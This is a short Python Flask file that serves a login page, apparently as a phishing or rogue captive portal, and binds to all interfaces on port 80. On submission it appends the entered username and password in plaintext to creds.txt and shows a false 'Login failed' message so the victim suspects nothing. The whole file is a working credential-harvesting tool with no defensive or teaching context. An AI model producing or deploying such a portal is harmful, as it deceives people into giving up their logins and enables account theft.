from flask import Flask, request, redirect, render_template
import os

app = Flask(__name__, template_folder='templates')

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('creds.txt', 'a') as f:
            f.write(f"{username}:{password}\n")
        return "Login failed. Try again later."
    return render_template('login.html')

def run_portal():
    app.run(host='0.0.0.0', port=80)
